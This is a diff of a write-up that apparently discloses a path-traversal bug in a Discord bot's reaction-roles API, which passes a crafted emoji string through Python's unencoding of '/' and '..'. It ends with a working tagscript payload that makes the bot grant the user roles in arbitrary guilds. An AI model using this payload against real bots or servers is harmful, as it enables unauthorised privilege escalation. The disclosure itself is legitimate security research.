@@ -16,7 +16,7 @@ On the roles category, there's a function called "Reaction Roles" that lets you 
 
 When creating one, a `PUT` request is made to `/api/v1/servers/<guild_id>/reactionroles` with the following body (mode set as "Use ID" and removing not needed fields):
 
-```json
+```json - schema.json
 {
     "channel_id":"[Snowflake]",
     "content":"[str]",
@@ -45,7 +45,7 @@ The `pairs[n].emoji` field looks interesting... why? because seeing the Discord 
 
 The only thing is that it will be urlencoded, but by the error messages I saw that the backend is made on Python (and the bot is made on Pycord). Most devs will use the `quote` function from the `urllib.parse` library... and this function has a quirk:
 
-```python
+```python repl
 >>> from urllib.parse import quote
 >>> quote("uwu/owo/../../#?")
 'uwu/owo/../../%23%3F'
@@ -77,7 +77,7 @@ On this one, to react with custom emoji you must put it in the format `<:emoji:[
 
 This makes the bug very funny, because with this you can create a command (tag) like:
 
-```
+```bash - command.tagscript
 {reactu: <:02:1441484566547398787/../../../../../../guilds/{args(1)}/members/<your_id>/roles/{args(2)}#>}
 Succesfully gave to you role {args(2)} in {args(1)}
 ```
